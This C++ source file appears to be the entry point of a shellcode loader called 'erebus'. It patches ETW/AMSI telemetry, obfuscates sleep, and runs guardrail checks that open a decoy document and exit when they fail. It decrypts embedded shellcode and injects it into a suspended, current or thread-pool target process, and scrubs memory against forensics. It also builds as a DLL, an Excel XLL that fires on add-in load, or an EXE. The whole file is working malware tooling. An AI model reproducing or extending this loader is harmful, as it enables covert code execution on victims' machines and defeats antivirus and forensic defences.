#include "../include/loader.hpp"
#include "../include/shellcode.hpp"
#include "../include/shellcode_optional.hpp"
#include "../include/config.hpp"
#include "../include/evasion/evasion.hpp"
#include "../include/evasion/sleep_obfuscation.hpp"

VOID entry(void)
{
	// ============================================================
	// EVASION PATCHES - run before any shellcode processing
	// ============================================================
	erebus::evasion::RunEvasionPatches();

	// ============================================================
	// PRE-INJECTION DWELL (sleep obfuscation)
	// Runs after ETW/AMSI patches so memory-scanner events during
	// the wait window are suppressed. Controlled by:
	//   CONFIG_SLEEP_OBFUSCATION_TYPE  (0=off, 1=timer, 2=ekko-lite)
	//   CONFIG_SLEEP_OBFUSCATION_BASE_MS / CONFIG_SLEEP_OBFUSCATION_JITTER_MS
	// ============================================================
	#if CONFIG_SLEEP_OBFUSCATION_TYPE > 0
		erebus::evasion::ObfuscatedDwell(
			CONFIG_SLEEP_OBFUSCATION_BASE_MS,
			CONFIG_SLEEP_OBFUSCATION_JITTER_MS
		);
	#endif

	// ============================================================
	// GUARDRAILS CHECK
	// ============================================================
	#if CONFIG_GUARDRAILS_ENABLED
		erebus::guardrails::GuardrailConfig guardrail_config = GetGuardrailConfig();
		erebus::guardrails::CheckResult guardrail_result = erebus::guardrails::RunGuardrails(guardrail_config);
		
		if (!guardrail_result.passed) {
			// Guardrails failed - open decoy file if configured, then exit
			const char* decoy = CONFIG_GUARDRAILS_DECOY_FILE;
			if (decoy && decoy[0] != '\0') {
				ShellExecuteA(NULL, "open", decoy, NULL, NULL, SW_SHOWNORMAL);
			}
			return;
		}
	#endif

	erebus::config.injection_method = erebus::GetInjectionMethod();

	HANDLE process_handle = INVALID_HANDLE_VALUE;
	HANDLE thread_handle = INVALID_HANDLE_VALUE;
	SIZE_T shellcode_size = sizeof(shellcode);

	if (shellcode_size == 0 || (sizeof(shellcode) > 0 && shellcode[0] == 0x00))
	{
		LOG_ERROR("Shellcode is NULL or size is 0 after staging");
		return;
	}

	LOG_SUCCESS("Shellcode staged successfully: %zu bytes", shellcode_size);

#if CONFIG_INJECTION_MODE == 1
	// Remote injection: create suspended process
	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
	LOG_INFO("Creating suspended process: %ls", cmdline);
	if (!erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle))
	{
		LOG_ERROR("Failed to create suspended process");
		return;
	}
	LOG_SUCCESS("Process created (PID: 0x%lX)", GetProcessId(process_handle));
#elif CONFIG_INJECTION_MODE == 2
	// Self injection: use current process
	process_handle = NtCurrentProcess();
	thread_handle = NtCurrentThread();
	LOG_SUCCESS("Using self-injection (current process)");
#elif CONFIG_INJECTION_MODE == 3
	// PoolParty injection: inject into existing process with active thread pool
	// Find target process by name hash, checking for thread pool existence
	constexpr ULONG targets[] = {
		CONFIG_TARGET_PROCESS
	};
	const SIZE_T targetCount = sizeof(targets) / sizeof(targets[0]);

	DWORD pid = 0;
	BOOL foundThreadPool = FALSE;
	
	// Iterate through all matching processes to find one with an active thread pool
	for (SIZE_T attempt = 0; attempt < targetCount * 3 && !foundThreadPool; attempt++) {
		// Get next matching process from hash list (skips already-tried PIDs internally)
		pid = erebus::ProcessGetPidFromHashedListEx((DWORD*)targets, targetCount, attempt);
		if (pid == 0) {
			LOG_INFO("No more matching processes found in hash list");
			break;
		}
		
		LOG_INFO("Checking process (PID: %lu) for thread pool...", pid);
		
		process_handle = erebus::GetProcessHandle(pid);
		if (!process_handle || process_handle == INVALID_HANDLE_VALUE) {
			LOG_INFO("Could not open process (PID: %lu), trying next...", pid);
			continue;
		}
		
		// Check if process has an active thread pool (IoCompletion handle)
		if (erebus::ProcessHasThreadPool(process_handle)) {
			LOG_SUCCESS("Found target process with thread pool (PID: %lu)", pid);
			foundThreadPool = TRUE;
		} else {
			LOG_INFO("Process (PID: %lu) has no thread pool, trying next...", pid);
			CloseHandle(process_handle);
			process_handle = INVALID_HANDLE_VALUE;
		}
	}
	
	if (!foundThreadPool || pid == 0) {
		LOG_ERROR("Failed to find any target process with an active thread pool");
		LOG_INFO("Note: Try running as Administrator or target a different process");
		return;
	}
#endif

	if (!process_handle || !thread_handle)
	{
		LOG_ERROR("Invalid process or thread handle");
		return;
	}

	// ============================================================
	// PAYLOAD PROCESSING PIPELINE
	// ============================================================
	// 1. Allocate writable buffer for shellcode (decrypt modifies in-place)
	// 2. Decrypt shellcode based on CONFIG_ENCRYPTION_TYPE
	// 3. Decompress shellcode if needed
	// ============================================================

	// Allocate writable memory for shellcode via VirtualAlloc (avoids CRT heap
	// metadata that leaks allocation size to forensic tools).
	BYTE* shellcode_ptr = (BYTE*)VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!shellcode_ptr)
	{
		LOG_ERROR("Failed to allocate shellcode buffer");
		return;
	}
	RtlCopyMemory(shellcode_ptr, shellcode, shellcode_size);

	BYTE* iv = nullptr;
	SIZE_T iv_len = 0;
	#if CONFIG_ENCRYPTION_TYPE == 4
	if (ShellcodeHasNonce())
	{
		iv = nonce;
		iv_len = 16;
	}
	#endif

	// Decrypt with explicit key - key material is zeroed immediately after.
	BYTE key_copy[sizeof(key)];
	RtlCopyMemory(key_copy, key, sizeof(key));
	erebus::DecryptShellcodeWithKeyAndIv(&shellcode_ptr, &shellcode_size, key_copy, sizeof(key_copy), iv, iv_len);
	SecureZeroMemory(key_copy, sizeof(key_copy));

	erebus::DecompressShellcode(&shellcode_ptr, &shellcode_size);

	if (shellcode_ptr == NULL || shellcode_size == 0)
	{
		LOG_ERROR("Shellcode processing failed - invalid result");
		if (shellcode_ptr) {
			SecureZeroMemory(shellcode_ptr, shellcode_size);
			VirtualFree(shellcode_ptr, 0, MEM_RELEASE);
		}
		return;
	}

	LOG_SUCCESS("Processed shellcode: %zu bytes", shellcode_size);

	// Pin the decrypted buffer into the working set so it never reaches the
	// pagefile during the injection window. Best-effort - if the working-set
	// quota refuses the lock we still inject, we just accept the paging risk.
	BOOL locked = VirtualLock(shellcode_ptr, shellcode_size);

	// Execute injection
	erebus::config.injection_method(shellcode_ptr, shellcode_size, process_handle, thread_handle);

	// Scrub the staging buffer - shellcode is now in the target process.
	if (shellcode_ptr)
	{
		SecureZeroMemory(shellcode_ptr, shellcode_size);
		if (locked) VirtualUnlock(shellcode_ptr, shellcode_size);
		VirtualFree(shellcode_ptr, 0, MEM_RELEASE);
	}

	return;
}

#ifdef BUILD_DLL

static BOOL entry_called = FALSE;

static DWORD WINAPI EntryThread(LPVOID)
{
	entry();
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		if (!entry_called) {
			entry_called = TRUE;
			HANDLE hThread = CreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
			if (hThread) CloseHandle(hThread);
		}
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) HRESULT DllRegisterServer(void)
{
	if (!entry_called) {
		entry_called = TRUE;
		HANDLE hThread = CreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
		if (hThread) CloseHandle(hThread);
	}
	return S_OK;
}

extern "C" __declspec(dllexport) HRESULT DllUnregisterServer(void)
{
	return S_OK;
}

#elif defined(BUILD_XLL)

// xlAutoOpen is the XLL registration callback - Excel calls it synchronously
// after the add-in DLL is loaded.  Running entry() here keeps the DLL resident
// for the full duration of shellcode setup; returning 1 signals success to Excel.
extern "C" __declspec(dllexport) int WINAPI xlAutoOpen(void)
{
	entry();
	return 1;
}

// xlAutoClose must be exported; called when the add-in is unloaded.  No-op.
extern "C" __declspec(dllexport) int WINAPI xlAutoClose(void)
{
	return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
		DisableThreadLibraryCalls(hModule);
	return TRUE;
}

#elif defined(NDEBUG)

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	entry();
	return 0;
}

#else

int main()
{
	entry();
	return 0;
}

#endif
